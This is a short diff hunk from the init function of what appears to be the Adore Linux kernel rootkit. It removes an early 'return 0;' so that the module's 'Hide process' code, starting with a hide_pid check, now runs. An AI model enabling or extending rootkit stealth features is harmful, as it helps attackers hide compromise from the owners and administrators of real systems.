@@ -857,8 +857,6 @@ int __init adore_init(void)
 	printk(LOG_ADORE"	         ░  ░   ░        ░ ░     ░        ░  ░               ░       ░ \n");
 	printk(LOG_ADORE"			            ░                                                       \n"); 
 
-	return 0;
-
 	/* Hide process. */
 	if (hide_pid != -1)
 	{
